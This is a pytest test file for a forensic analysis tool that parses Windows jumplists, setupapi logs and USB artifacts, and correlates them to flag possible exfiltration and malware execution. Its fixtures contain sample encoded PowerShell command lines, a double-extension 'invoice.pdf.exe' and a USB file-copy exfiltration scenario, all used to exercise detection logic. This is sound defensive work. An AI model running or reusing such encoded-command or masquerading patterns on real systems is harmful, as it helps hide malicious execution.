    root = Path(__file__).parent / "fixtures" / "jumplists" / "velociraptor_collection_jumplists"
    discovery = discover_velociraptor_evidences(root)
    jumplist_candidates = [item for item in discovery.candidates if item.category == "jumplist"]
    assert len(jumplist_candidates) == 2
    automatic = next(item for item in jumplist_candidates if item.destination_type == "automatic")
    custom = next(item for item in jumplist_candidates if item.destination_type == "custom")
    assert automatic.supported is True
    assert automatic.parser_status == "ready"
    assert automatic.parser == "jumplist_raw_automatic"
    assert automatic.user == "alex"
    assert automatic.app_id == "5f7b5f1e01b83767"
    assert automatic.normalized_windows_path == "C:\\Users\\alex\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\5f7b5f1e01b83767.automaticDestinations-ms"
    assert custom.artifact_type == "jumplist_custom_destinations"
    assert custom.supported is True
    assert custom.parser_status == "partial"


def test_velociraptor_discovery_detects_setupapi_usb() -> None:
    root = Path(__file__).parent / "fixtures" / "usb" / "velociraptor_collection_usb"
    discovery = discover_velociraptor_evidences(root)
    usb_candidates = [item for item in discovery.candidates if item.category == "usb"]
    assert usb_candidates
    setupapi = next(item for item in usb_candidates if item.artifact_type == "setupapi_dev_log")
    assert setupapi.supported is True
    assert setupapi.parser_status == "ready"
    assert setupapi.parser == "usb_setupapi"
    assert setupapi.normalized_windows_path == "C:\\Windows\\INF\\setupapi.dev.log"


def test_parse_setupapi_dev_log_extracts_usb_fields() -> None:
    source = Path(__file__).parent / "fixtures" / "usb" / "setupapi_dev_sample.log"
    rows, warnings, audit = parse_setupapi_dev_log(source, source_path="C:\\Windows\\INF\\setupapi.dev.log")
    assert rows
    row = rows[0]
    assert row["DeviceInstanceId"] == "USBSTOR\\Disk&Ven_SanDisk&Prod_Ultra&Rev_1.00\\1234567890ABCDEF&0"
    assert row["Vendor"] == "SanDisk"
    assert row["Product"] == "Ultra"
    assert row["Revision"] == "1.00"
    assert row["Serial"] == "1234567890ABCDEF"
    assert row["Service"] == "disk"
    assert row["InfPath"] == "C:\\Windows\\INF\\disk.inf"
    assert row["ArtifactType"] == "setupapi_device_install"
    assert audit["setupapi_usb_blocks"] >= 1
    assert warnings == []


def test_parse_setupapi_dev_log_extracts_vid_pid_usb_fields() -> None:
    source = Path(__file__).parent / "fixtures" / "usb" / "setupapi_vidpid_sample.log"
    rows, warnings, audit = parse_setupapi_dev_log(source, source_path="C:\\Windows\\INF\\setupapi.dev.log")
    assert rows
    row = rows[0]
    assert row["DeviceInstanceId"] == "USB\\VID_0781&PID_5581\\1234567890ABCDEF"
    assert row["VID"] == "0781"
    assert row["PID"] == "5581"
    assert row["Serial"] == "1234567890ABCDEF"
    assert row["DeviceType"] == "usb_device"
    assert audit["vendor_product_parsed_count"] >= 1
    assert warnings == []


def test_setupapi_driver_update_block_is_not_usb_device_install(tmp_path: Path) -> None:
    source = tmp_path / "setupapi.dev.log"
    source.write_text(
        "\n".join(
            [
                ">>> [Install Driver Updates]",
                ">>> Section start 2026/03/11 18:24:10.781",
                "cmd: C:\\Windows\\System32\\TiWorker.exe -Embedding",
                "dvi: Device Instance ID - USB\\Class_07",
                "dvi: Compatible IDs - GENERIC_USB_PRINTER",
                "ndv: Service - ThermalFilter}",
                "ndv: Provider - Microsoft-Windows-USB-USB4DeviceRouter-EventLogs}",
                "ndv: Using WDF schema version 2.23 when section requires version 2.25. Section = [UsbNcm_Device.NT.Wdf]",
                "!!!  ndv: Result = SUCCESS (REBOOT_REQUIRED)]",
                "<<< Section end 2026/03/11 18:24:19.806",
                "",
            ]
        ),
        encoding="utf-8",
    )
    rows, warnings, audit = parse_setupapi_dev_log(source, source_path="C:\\Windows\\INF\\setupapi.dev.log")
    assert rows
    row = rows[0]
    assert row["EventType"] == "setupapi_driver_update"
    assert row["ArtifactType"] == "setupapi_driver_update"
    assert row["DeviceType"] == "driver_update"
    assert row["Service"] == "ThermalFilter"
    assert row["DriverProvider"] == "Microsoft-Windows-USB-USB4DeviceRouter-EventLogs"
    assert row["ResultCode"] == "SUCCESS (REBOOT_REQUIRED)"
    assert row["InfPath"] is None
    assert "setupapi_inf_message_rejected" in row["ParseWarnings"]
    assert audit["setupapi_driver_update_blocks"] == 1
    assert audit["setupapi_device_install_blocks"] == 0
    assert warnings


def test_setupapi_driver_update_normalization_uses_driver_update_artifact_type(tmp_path: Path) -> None:
    source = tmp_path / "setupapi.dev.log"
    source.write_text(
        "\n".join(
            [
                ">>> [Install Driver Updates]",
                ">>> Section start 2026/03/11 18:24:10.781",
                "dvi: Device Instance ID - USB\\Class_07",
                "<<< Section end 2026/03/11 18:24:19.806",
            ]
        ),
        encoding="utf-8",
    )
    docs = normalize_file(
        "case-1",
        "ev-1",
        "art-1",
        source,
        {
            "artifact_type": "usb",
            "parser": "usb_setupapi",
            "usb_artifact_type": "setupapi_dev_log",
            "source_tool": "velociraptor_raw",
            "source_format": "log",
            "source_path": "C:\\Windows\\INF\\setupapi.dev.log",
            "name": source.name,
        },
    )
    assert docs
    doc = docs[0]
    assert doc["usb"]["artifact_type"] == "setupapi_driver_update"
    assert doc["event"]["type"] == "setupapi_driver_update"
    assert doc["usb"]["device_type"] == "driver_update"
    assert doc["risk_score"] <= 5
    assert "driver_update" in doc["tags"]
    assert doc["artifact"]["parser"] == "usb_setupapi"
    assert "setupapi" in doc["tags"]
    assert "missing_file_path" not in doc["data_quality"]
    assert "missing_file_name" not in doc["data_quality"]


def test_useful_usb_device_instance_id_rejects_class_generic() -> None:
    assert is_useful_usb_device_instance_id("USB\\Class_07") is False
    assert is_useful_usb_device_instance_id("USB\\ROOT_HUB30") is False
    assert is_useful_usb_device_instance_id("USBSTOR\\Disk&Ven_SanDisk&Prod_Ultra&Rev_1.00\\1234567890ABCDEF&0") is True


def test_clean_setupapi_value_preserves_valid_guid_braces() -> None:
    assert clean_setupapi_value("{36FC9E60-C465-11CF-8056-444553540000}") == "{36FC9E60-C465-11CF-8056-444553540000}"
    assert clean_setupapi_value("{36FC9E60-C465-11CF-8056-444553540000}}") == "{36FC9E60-C465-11CF-8056-444553540000}"


def test_setupapi_usb_class_generic_is_low_value() -> None:
    rows, warnings, audit = parse_setupapi_dev_log(
        Path(__file__).parent / "fixtures" / "usb" / "setupapi_vidpid_sample.log",
        source_path="C:\\Windows\\INF\\setupapi.dev.log",
    )
    assert rows[0]["EventType"] == "usb_device_install"
    assert audit["usb_vidpid_blocks"] >= 1
    assert warnings == []


def test_setupapi_timestamp_prefers_section_start(tmp_path: Path) -> None:
    source = tmp_path / "setupapi.dev.log"
    source.write_text(
        "\n".join(
            [
                ">>> [Device Install (Hardware initiated)]",
                ">>> Section start 2026/03/11 18:24:10.781",
                "dvi: Device Instance ID - USBSTOR\\Disk&Ven_SanDisk&Prod_Ultra&Rev_1.00\\1234567890ABCDEF&0",
                "<<< Section end 2026/03/11 18:24:19.806",
            ]
        ),
        encoding="utf-8",
    )
    rows, _, audit = parse_setupapi_dev_log(source, source_path="C:\\Windows\\INF\\setupapi.dev.log")
    assert rows[0]["Timestamp"] == rows[0]["SectionStartTime"]
    assert rows[0]["SectionEndTime"] is not None
    assert audit["timestamp_from_section_start_count"] == 1


def test_setupapi_class_generic_normalizes_as_low_value(tmp_path: Path) -> None:
    source = tmp_path / "setupapi.dev.log"
    source.write_text(
        "\n".join(
            [
                ">>> [Device Install]",
                ">>> Section start 2026/03/11 18:24:10.781",
                "dvi: Device Instance ID - USB\\Class_07",
                "dvi: Hardware Id - USB\\Class_07",
                "<<< Section end 2026/03/11 18:24:19.806",
            ]
        ),
        encoding="utf-8",
    )
    docs = normalize_file(
        "case-1",
        "ev-1",
        "art-1",
        source,
        {
            "artifact_type": "usb",
            "parser": "usb_setupapi",
            "source_tool": "velociraptor_raw",
            "source_format": "log",
            "source_path": "C:\\Windows\\INF\\setupapi.dev.log",
            "name": source.name,
        },
    )
    assert docs
    doc = docs[0]
    assert doc["event"]["type"] == "usb_class_generic"
    assert doc["event"]["severity"] == "info"
    assert doc["risk_score"] <= 5
    assert "usb_class_generic" in doc["tags"]
    assert "usb" not in set(doc["tags"])


def test_usb_registry_csv_normalization() -> None:
    path = Path(__file__).parent / "fixtures" / "usb" / "usb_registry_sample.csv"
    documents = normalize_file(
        "case-1",
        "ev-1",
        "art-1",
        path,
        {
            "artifact_type": "usb",
            "parser": "usb_registry",
            "source_tool": "usb_registry_csv",
            "source_format": "csv",
            "source_path": str(path),
            "name": path.name,
        },
    )
    assert documents
    document = documents[0]
    assert document["artifact"]["type"] == "usb"
    assert document["usb"]["vendor"] == "SanDisk"
    assert document["usb"]["serial"] == "1234567890ABCDEF"
    assert document["volume"]["drive_letter"] == "E:"
    assert document["volume"]["serial"] == "ABCD1234"
    assert document["artifact"]["parser"] == "usb_registry"
    assert document["event"]["type"] == "usb_connected"


def test_usb_removal_event_prefers_last_removal_time() -> None:
    document = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        {
            "ArtifactType": "usb_registry",
            "DeviceInstanceId": "USBSTOR\\Disk&Ven_SanDisk&Prod_Ultra&Rev_1.00\\1234567890ABCDEF&0",
            "Vendor": "SanDisk",
            "Product": "Ultra",
            "Serial": "1234567890ABCDEF",
            "LastRemovalTime": "2026-05-15T12:00:00Z",
            "SourceFile": "C:\\Windows\\System32\\config\\SYSTEM",
        },
        {"artifact_type": "usb", "parser": "usb_registry", "source_path": "C:\\Windows\\System32\\config\\SYSTEM", "name": "usb.csv"},
    )
    assert document["event"]["type"] == "usb_disconnected"
    assert document["timestamp_precision"] == "usb_last_removal_time"


def test_usb_evtx_userpnp_normalization() -> None:
    document = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        {
            "EventID": 20001,
            "Provider": "Microsoft-Windows-UserPnp",
            "Channel": "Microsoft-Windows-UserPnp/DeviceInstall",
            "TimeCreated": "2026-05-15T10:00:00Z",
            "DeviceInstanceId": "USB\\VID_0781&PID_5581\\1234567890ABCDEF",
            "Computer": "DESKTOP-USB",
        },
        {"artifact_type": "usb", "parser": "usb_evtx", "source_path": "C:\\Windows\\System32\\winevt\\Logs\\Microsoft-Windows-UserPnp.evtx", "name": "usb_evtx_userpnp.jsonl"},
    )
    assert document["artifact"]["type"] == "usb"
    assert document["artifact"]["parser"] == "usb_evtx"
    assert str(document["windows"]["event_id"]) == "20001"
    assert document["event"]["type"] == "usb_installed"
    assert document["timestamp_precision"] == "event_time"
    assert document["host"]["name"] == "desktop-usb"


def test_usb_hid_is_low_risk() -> None:
    document = normalize_usb_row(
        {
            "artifact": {"type": "usb", "parser": "usb_jsonl", "source_path": "usb.jsonl", "name": "usb.jsonl"},
            "event": {},
            "usb": {},
            "volume": {},
            "registry": {},
            "windows": {},
            "host": {"name": None, "hostname": None},
            "user": {"name": None, "sid": None},
            "execution": {},
            "data_quality": [],
            "tags": [],
            "source_file": "usb.jsonl",
        },
        {
            "DeviceInstanceId": "USB\\VID_046D&PID_C534\\6&2B8E0F4E&0&2",
            "ClassName": "HIDClass",
            "FriendlyName": "USB Receiver",
            "TimeCreated": "2026-05-15T10:00:00Z",
        },
        {"parser": "usb_jsonl", "source_path": "usb.jsonl"},
    )
    assert document["usb"]["device_type"] == "hid"
    assert int(document["risk_score"]) <= 10
    assert "USB mass storage device observed" not in (document.get("suspicious_reasons") or [])


def test_usb_host_not_inferred_from_setupapi_filename() -> None:
    document = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        {
            "ArtifactType": "setupapi_device_install",
            "DeviceInstanceId": "USBSTOR\\Disk&Ven_Kingston&Prod_DataTraveler&Rev_1.00\\ABCDEF123456&0",
            "SectionStartTime": "2026-05-15T10:00:00Z",
            "SourceFile": "C:\\Windows\\INF\\setupapi.dev.log",
            "Computer": "setupapi.dev.log",
        },
        {"artifact_type": "usb", "parser": "usb_setupapi", "source_path": "C:\\Windows\\INF\\setupapi.dev.log", "name": "setupapi.dev.log"},
    )
    assert document["host"]["name"] is None
    assert "host_name_not_inferred_from_filename" in (document.get("data_quality") or [])


def test_usb_parse_report_counts_events_and_sources() -> None:
    parser_audit = [
        {
            "artifact_type": "usb",
            "parser_name": "usb_registry",
            "records_read": 2,
            "records_parsed": 2,
            "records_indexed": 2,
            "source_file": "usbstor_registry.jsonl",
            "by_event_type": {"usb_connected": 1, "usb_observed": 1},
            "by_device_type": {"mass_storage": 2},
            "by_vendor": {"SanDisk": 2},
            "by_product": {"Ultra": 2},
            "by_serial_presence": {"present": 2},
            "by_drive_letter": {"E:": 1},
            "by_volume_serial": {"ABCD1234": 1},
            "usb_storage_count": 2,
            "connected_count": 1,
            "observed_count": 1,
        }
    ]
    events = [
        {
            "id": "usb-1",
            "artifact": {"type": "usb", "parser": "usb_registry", "source_path": "usbstor_registry.jsonl"},
            "event": {"type": "usb_connected"},
            "usb": {"device_type": "mass_storage", "vendor": "SanDisk", "product": "Ultra", "serial": "123", "source_file": "usbstor_registry.jsonl"},
            "volume": {"drive_letter": "E:", "serial": "ABCD1234"},
            "data_quality": [],
            "suspicious_reasons": ["USB mass storage device observed"],
        },
        {
            "id": "usb-2",
            "artifact": {"type": "usb", "parser": "usb_registry", "source_path": "mounteddevices.jsonl"},
            "event": {"type": "usb_observed"},
            "usb": {"device_type": "mass_storage", "vendor": "SanDisk", "product": "Ultra", "serial": "123", "source_file": "mounteddevices.jsonl"},
            "volume": {"drive_letter": "E:", "serial": "ABCD1234"},
            "data_quality": [],
            "suspicious_reasons": ["USB mass storage device observed", "USB drive letter assigned"],
        },
    ]
    report = _build_usb_parse_report(parser_audit, [], events, selected_artifact_types=["usb"], scope="evidence")
    assert report["records_indexed"] == 2
    assert sum(report["by_event_type"].values()) == 2
    assert report["by_device_type"]["mass_storage"] == 2
    assert report["mass_storage_count"] >= 2
    assert report["usb_sources_parsed"] == 1


def test_usb_sample_events_includes_mass_storage() -> None:
    events = [
        {
            "id": "usb-1",
            "artifact": {"type": "usb", "parser": "usb_registry"},
            "event": {"type": "usb_connected"},
            "usb": {"device_type": "mass_storage"},
            "volume": {"drive_letter": "E:"},
            "suspicious_reasons": ["USB mass storage device observed"],
        }
    ]
    sample = _build_usb_sample_events(events)
    assert len(sample) == 1
    assert sample[0]["event"]["type"] == "usb_connected"


def test_scheduled_task_usb_path_regression() -> None:
    classified = classify_artifact(Path("C:/Windows/System32/Tasks/Microsoft/Windows/USB/Usb-Notifications"), headers=None)
    assert classified["artifact_type"] == "scheduled_task"


def test_generic_csv_not_classified_as_usb() -> None:
    classified = classify_artifact(Path("generic_unrelated.csv"), headers=["Name", "Value", "Description"])
    assert classified["artifact_type"] != "usb"


def test_generic_csv_not_promoted_to_scheduled_task_by_single_description_column() -> None:
    classified = classify_artifact(Path("generic_unrelated.csv"), headers=["Name", "Value", "Description"])
    assert classified["artifact_type"] != "scheduled_task"


def test_usb_jsonl_not_misclassified_as_defender() -> None:
    classified = classify_artifact(
        Path("setupapi_usb_success.jsonl"),
        headers=["ArtifactType", "DeviceInstanceId", "InstallStatus", "ResultCode", "SourceFile"],
    )
    assert classified["artifact_type"] == "usb"
    assert classified["parser"] == "usb_jsonl"


def test_velociraptor_discovery_marks_usb_system_hive_not_supported(tmp_path: Path) -> None:
    root = tmp_path / "velociraptor_usb_hive"
    hive_dir = root / "uploads" / "auto" / "C%3A" / "Windows" / "System32" / "config"
    hive_dir.mkdir(parents=True, exist_ok=True)
    (hive_dir / "SYSTEM").write_bytes(b"regf")
    discovery = discover_velociraptor_evidences(root)
    system_hive = next((item for item in discovery.candidates if item.artifact_type == "registry_system_hive_usb_candidate"), None)
    shimcache_or_service = next((item for item in discovery.candidates if item.original_path.endswith("/SYSTEM") and item.category in {"shimcache", "service"}), None)
    assert system_hive is not None or shimcache_or_service is not None
    if system_hive is not None:
        assert system_hive.supported is False
        assert system_hive.parser_status == "detected_not_implemented"


def test_setupapi_driver_update_not_in_usb_devices_section() -> None:
    event = {
        "id": "usb-driver-update",
        "event_id": "usb-driver-update",
        "@timestamp": "2026-03-11T18:24:10.781000+00:00",
        "event": {"type": "setupapi_driver_update", "severity": "info", "message": "SetupAPI driver update block observed"},
        "artifact": {"type": "usb", "parser": "usb_setupapi"},
        "host": {"name": "host1"},
        "usb": {"device_type": "driver_update", "device_instance_id": "USB\\Class_07", "source_file": "C:\\Windows\\INF\\setupapi.dev.log"},
        "tags": ["setupapi", "driver_update"],
        "source_tool": "setupapi_dev_log",
    }
    activities = correlate_usb_activity(event_to_activity(event))
    kinds = {item.activity_type for item in activities}
    assert "setupapi_driver_update" in kinds
    assert "usb_device_install" not in kinds


def test_usb_correlation_creates_download_and_exfiltration_candidates() -> None:
    usb_event = {
        "id": "usb-1",
        "event_id": "usb-1",
        "@timestamp": "2026-05-03T10:30:00+00:00",
        "event": {"type": "usb_installed", "severity": "info", "message": "USB device observed"},
        "host": {"name": "host1"},
        "user": {"name": "alex"},
        "usb": {"vendor": "SanDisk", "product": "Ultra", "serial": "1234567890ABCDEF", "friendly_name": "SanDisk Ultra USB Device"},
        "volume": {"drive_letter": "E:", "serial": "ABCD1234", "drive_type": "removable"},
        "tags": ["usb", "usb_storage", "removable_device"],
        "suspicious_reasons": [],
    }
    browser_event = {
        "id": "b-1",
        "event_id": "b-1",
        "@timestamp": "2026-05-03T10:40:00+00:00",
        "event": {"type": "file_downloaded", "severity": "info", "message": "Downloaded file"},
        "artifact": {"type": "browser", "parser": "browser_jsonl"},
        "host": {"name": "host1"},
        "user": {"name": "alex"},
        "file": {"path": "E:\\Downloads\\payload.exe", "name": "payload.exe", "extension": ".exe"},
        "download": {"target_path": "E:\\Downloads\\payload.exe", "file_name": "payload.exe"},
        "tags": ["download"],
        "suspicious_reasons": [],
    }
    ps_event = {
        "id": "ps-1",
        "event_id": "ps-1",
        "@timestamp": "2026-05-03T10:45:00+00:00",
        "event": {"type": "powershell_console_history", "severity": "info", "message": "PowerShell console command: Copy-Item"},
        "host": {"name": "host1"},
        "user": {"name": "alex"},
        "process": {"name": "powershell.exe", "command_line": "Copy-Item C:\\Users\\alex\\Documents\\*.docx E:\\Backup\\"},
        "powershell": {"command": "Copy-Item C:\\Users\\alex\\Documents\\*.docx E:\\Backup\\", "artifact_type": "psreadline_history"},
        "tags": ["powershell"],
        "suspicious_reasons": [],
    }
    activities = []
    for event in (usb_event, browser_event, ps_event):
        activities.extend(event_to_activity(event))
    correlated = correlate_usb_activity(activities)
    kinds = {item.activity_type for item in correlated}
    assert "usb_download_to_external_drive" in kinds
    assert "possible_usb_exfiltration_candidate" in kinds


def test_correlation_usb_alone_does_not_create_usb_exfil_candidate(monkeypatch: pytest.MonkeyPatch) -> None:
    case = Case(id="case-1", name="Noise Reduction")
    evidence = Evidence(id="evidence-1", case_id="case-1", original_filename="usb.jsonl", stored_path="usb.jsonl", evidence_type=EvidenceType.parsed_folder, sha256="00", size_bytes=1, ingest_status=IngestStatus.completed, metadata_json={}, error_log={})
    session = _CorrelationSession(case, [evidence])
    usb_event = {
        "id": "usb-alone-1",
        "event_id": "usb-alone-1",
        "evidence_id": "evidence-1",
        "@timestamp": "2026-05-15T10:00:00+00:00",
        "artifact": {"type": "usb"},
        "event": {"type": "usb_connected", "message": "USB connected"},
        "usb": {"device_type": "mass_storage", "vendor": "SanDisk"},
        "tags": ["usb", "usb_storage", "removable_device", "informational_usb_only"],
        "risk_score": 10,
        "execution": {"is_execution_confirmed": False},
    }
    monkeypatch.setattr("app.services.correlation_engine._iter_events_for_case", lambda case_id, evidence_id=None: [usb_event])
    monkeypatch.setattr("app.services.correlation_engine.build_process_tree_bundle", lambda *args, **kwargs: {"graph": {"nodes": [], "edges": [], "summary": {}}})
    result = run_correlation_engine(session, "case-1")
    assert not any(item["finding_type"] == "usb_exfil_candidate" for item in result["findings"])


def test_usb_mass_storage_connection_alone_is_downgraded_to_informational() -> None:
    document = normalize_row(
        "case-1",
        "ev-1",
        "art-1",
        {
            "ArtifactType": "usb_registry",
            "DeviceInstanceId": "USBSTOR\\Disk&Ven_SanDisk&Prod_Ultra&Rev_1.00\\1234567890ABCDEF&0",
            "Vendor": "SanDisk",
            "Product": "Ultra",
            "Serial": "1234567890ABCDEF",
            "FirstInstallTime": "2026-05-15T09:00:00Z",
            "LastArrivalTime": "2026-05-15T09:30:00Z",
            "DriveLetter": "E:",
            "VolumeSerial": "ABCD1234",
            "SourceFile": "C:\\Windows\\System32\\config\\SYSTEM",
        },
        {
            "artifact_type": "usb",
            "parser": "usb_jsonl",
            "source_path": "usb_alone.jsonl",
            "name": "usb_alone.jsonl",
            "source_tool": "usb_export",
            "source_format": "jsonl",
        },
    )
    assert document["artifact"]["type"] == "usb"
    assert document["risk_score"] <= 10
    assert "informational_usb_only" in (document.get("tags") or [])
    assert document.get("event", {}).get("risk_adjustment", {}).get("final_score") == document["risk_score"]


def test_correlation_filename_only_download_execute_detect_is_downgraded(monkeypatch: pytest.MonkeyPatch) -> None:
    case = Case(id="case-1", name="Noise Reduction")
    evidence = Evidence(id="evidence-1", case_id="case-1", original_filename="corr.jsonl", stored_path="corr.jsonl", evidence_type=EvidenceType.parsed_folder, sha256="00", size_bytes=1, ingest_status=IngestStatus.completed, metadata_json={}, error_log={})
    session = _CorrelationSession(case, [evidence])
    events = [
        {
            "id": "browser-1",
            "event_id": "browser-1",
            "evidence_id": "evidence-1",
            "@timestamp": "2026-05-15T10:00:00+00:00",
            "artifact": {"type": "browser"},
            "event": {"type": "file_downloaded", "message": "Browser download"},
            "download": {"target_path": r"C:\Users\dfir\Downloads\payload.exe", "file_name": "payload.exe"},
            "file": {"path": r"C:\Users\dfir\Downloads\payload.exe", "name": "payload.exe"},
        },
        {
            "id": "proc-1",
            "event_id": "proc-1",
            "evidence_id": "evidence-1",
            "@timestamp": "2026-05-15T10:10:00+00:00",
            "artifact": {"type": "process"},
            "event": {"type": "process_start", "message": "Process start"},
            "execution": {"is_execution_confirmed": True},
            "process": {"path": r"C:\Users\dfir\AppData\Local\Temp\payload.exe", "name": "payload.exe"},
        },
        {
            "id": "def-1",
            "event_id": "def-1",
            "evidence_id": "evidence-1",
            "@timestamp": "2026-05-15T10:20:00+00:00",
            "artifact": {"type": "defender"},
            "event": {"type": "defender_detection", "message": "Defender detected payload"},
            "detection": {"path": r"C:\Users\dfir\AppData\Local\Temp\payload.exe", "threat_name": "Trojan:Win32/Test"},
        },
    ]
    monkeypatch.setattr("app.services.correlation_engine._iter_events_for_case", lambda case_id, evidence_id=None: events)
    monkeypatch.setattr("app.services.correlation_engine.build_process_tree_bundle", lambda *args, **kwargs: {"graph": {"nodes": [], "edges": [], "summary": {}}})
    result = run_correlation_engine(session, "case-1")
    finding = next(item for item in result["findings"] if item["finding_type"] == "download_execute_detect")
    assert finding["confidence"] in {"medium", "low"}
    assert finding["severity"] != "critical"
    assert "filename_only_match" in (finding.get("data_quality") or [])


def test_correlation_persistence_execution_inventory_only_stays_low_confidence(monkeypatch: pytest.MonkeyPatch) -> None:
    case = Case(id="case-1", name="Noise Reduction")
    evidence = Evidence(id="evidence-1", case_id="case-1", original_filename="corr.jsonl", stored_path="corr.jsonl", evidence_type=EvidenceType.parsed_folder, sha256="00", size_bytes=1, ingest_status=IngestStatus.completed, metadata_json={}, error_log={})
    session = _CorrelationSession(case, [evidence])
    events = [
        {
            "id": "autorun-1",
            "event_id": "autorun-1",
            "evidence_id": "evidence-1",
            "@timestamp": "2026-05-15T10:00:00+00:00",
            "artifact": {"type": "autorun"},
            "event": {"type": "autorun", "message": "Autorun observed"},
            "persistence": {"mechanism": "run_key", "path": r"C:\Users\dfir\AppData\Roaming\payload.exe", "command": r"C:\Users\dfir\AppData\Roaming\payload.exe"},
        },
        {
            "id": "shim-1",
            "event_id": "shim-1",
            "evidence_id": "evidence-1",
            "@timestamp": "2026-05-15T10:05:00+00:00",
            "artifact": {"type": "shimcache"},
            "event": {"type": "execution_candidate", "message": "Shimcache observed"},
            "execution": {"is_execution_confirmed": False},
            "file": {"path": r"C:\Users\dfir\AppData\Roaming\payload.exe", "name": "payload.exe"},
        },
    ]
    monkeypatch.setattr("app.services.correlation_engine._iter_events_for_case", lambda case_id, evidence_id=None: events)
    monkeypatch.setattr("app.services.correlation_engine.build_process_tree_bundle", lambda *args, **kwargs: {"graph": {"nodes": [], "edges": [], "summary": {}}})
    result = run_correlation_engine(session, "case-1")
    finding = next(item for item in result["findings"] if item["finding_type"] == "persistence_execution")
    assert finding["confidence"] == "low"
    assert finding["risk_score"] <= 45
    assert "inventory_only_execution_artifact_used" in (finding.get("data_quality") or [])


def test_correlation_cloud_sensitive_upload_remains_high(monkeypatch: pytest.MonkeyPatch) -> None:
    case = Case(id="case-1", name="Noise Reduction")
    evidence = Evidence(id="evidence-1", case_id="case-1", original_filename="corr.jsonl", stored_path="corr.jsonl", evidence_type=EvidenceType.parsed_folder, sha256="00", size_bytes=1, ingest_status=IngestStatus.completed, metadata_json={}, error_log={})
    session = _CorrelationSession(case, [evidence])
    cloud_event = {
        "id": "cloud-1",
        "event_id": "cloud-1",
        "evidence_id": "evidence-1",
        "@timestamp": "2026-05-15T10:00:00+00:00",
        "artifact": {"type": "cloud"},
        "event": {"type": "cloud_upload", "message": "Cloud upload observed"},
        "cloud": {"local_path": r"C:\Users\dfir\OneDrive\passwords.xlsx", "remote_path": "/Shared/passwords.xlsx", "shared": True},
        "file": {"path": r"C:\Users\dfir\OneDrive\passwords.xlsx", "name": "passwords.xlsx", "extension": ".xlsx"},
        "risk_score": 68,
        "suspicious_reasons": ["Cloud file name contains sensitive keyword", "Cloud shared sensitive item"],
    }
    monkeypatch.setattr("app.services.correlation_engine._iter_events_for_case", lambda case_id, evidence_id=None: [cloud_event])
    monkeypatch.setattr("app.services.correlation_engine.build_process_tree_bundle", lambda *args, **kwargs: {"graph": {"nodes": [], "edges": [], "summary": {}}})
    result = run_correlation_engine(session, "case-1")
    finding = next(item for item in result["findings"] if item["finding_type"] == "cloud_exfil_candidate")
    assert finding["severity"] in {"medium", "high"}
    assert any(
        reason in (finding.get("reasons") or [])
        for reason in ["Cloud upload of sensitive file", "Cloud shared sensitive item", "Cloud file name contains sensitive keyword"]
    )


def test_correlation_shimcache_alone_does_not_create_execution_findings(monkeypatch: pytest.MonkeyPatch) -> None:
    case = Case(id="case-1", name="Noise Reduction")
    evidence = Evidence(id="evidence-1", case_id="case-1", original_filename="corr.jsonl", stored_path="corr.jsonl", evidence_type=EvidenceType.parsed_folder, sha256="00", size_bytes=1, ingest_status=IngestStatus.completed, metadata_json={}, error_log={})
    session = _CorrelationSession(case, [evidence])
    shim_event = {
        "id": "shim-only-1",
        "event_id": "shim-only-1",
        "evidence_id": "evidence-1",
        "@timestamp": "2026-05-15T10:00:00+00:00",
        "artifact": {"type": "shimcache"},
        "event": {"type": "execution_candidate", "message": "Shimcache entry observed"},
        "execution": {"is_execution_confirmed": False},
        "file": {"path": r"C:\Users\dfir\AppData\Local\Temp\payload.exe", "name": "payload.exe"},
    }
    monkeypatch.setattr("app.services.correlation_engine._iter_events_for_case", lambda case_id, evidence_id=None: [shim_event])
    monkeypatch.setattr("app.services.correlation_engine.build_process_tree_bundle", lambda *args, **kwargs: {"graph": {"nodes": [], "edges": [], "summary": {}}})
    result = run_correlation_engine(session, "case-1")
    finding_types = {item["finding_type"] for item in result["findings"]}
    assert "download_execute_detect" not in finding_types
    assert "execution_cleanup" not in finding_types

def test_parse_raw_automatic_destinations_with_mock_ole(monkeypatch, tmp_path: Path) -> None:
    source = tmp_path / "5a2098e080cf7ac4.automaticDestinations-ms"
    source.write_bytes(b"ole-placeholder")
    lnk = _build_minimal_shell_link_bytes(
        local_path="C:\\Users\\dfir\\Downloads\\invoice.pdf.exe",
        working_directory="C:\\Users\\dfir\\Downloads",
        arguments="powershell -enc QQ==",
        description="Suspicious download",
        accessed_at=datetime(2026, 5, 9, 10, 30, tzinfo=UTC),
        modified_at=datetime(2026, 5, 9, 10, 25, tzinfo=UTC),
        created_at=datetime(2026, 5, 9, 10, 20, tzinfo=UTC),
    )

    class FakeOle:
        def listdir(self, streams=True, storages=False):
            return [["DestList"], ["1"]]

        def openstream(self, name):
            if name == ["DestList"]:
                return io.BytesIO((3).to_bytes(4, "little") + b"\x00" * 64)
            return io.BytesIO(lnk)

        def close(self):
            return None

    monkeypatch.setattr("app.ingest.jumplists.raw_automatic.olefile", SimpleNamespace(isOleFile=lambda _: True, OleFileIO=lambda _: FakeOle()))
    rows, warnings, audit = parse_automatic_destinations_file(source, source_path="C:\\Users\\dfir\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\5a2098e080cf7ac4.automaticDestinations-ms", app_id="5a2098e080cf7ac4", user="dfir")
    assert rows
    assert rows[0]["LocalPath"] == "C:\\Users\\dfir\\Downloads\\invoice.pdf.exe"
    assert rows[0]["DestinationType"] == "automatic"
    assert rows[0]["AppId"] == "5a2098e080cf7ac4"
    assert audit["lnk_streams_parsed"] >= 1
    assert warnings


def test_parse_raw_custom_destinations_partial_scans_shell_links(tmp_path: Path) -> None:
    source = tmp_path / "5a2098e080cf7ac4.customDestinations-ms"
    lnk = _build_minimal_shell_link_bytes(
        local_path="C:\\Users\\dfir\\AppData\\Local\\Temp\\runme.ps1",
        arguments="powershell -NoP -enc QQ==",
        accessed_at=datetime(2026, 5, 9, 11, 0, tzinfo=UTC),
    )
    source.write_bytes(b"JUNK" + lnk + b"TAIL")
    rows, warnings, audit = parse_custom_destinations_file(source, source_path="C:\\Users\\dfir\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\CustomDestinations\\5a2098e080cf7ac4.customDestinations-ms", app_id="5a2098e080cf7ac4", user="dfir")
    assert rows
    assert rows[0]["DestinationType"] == "custom"
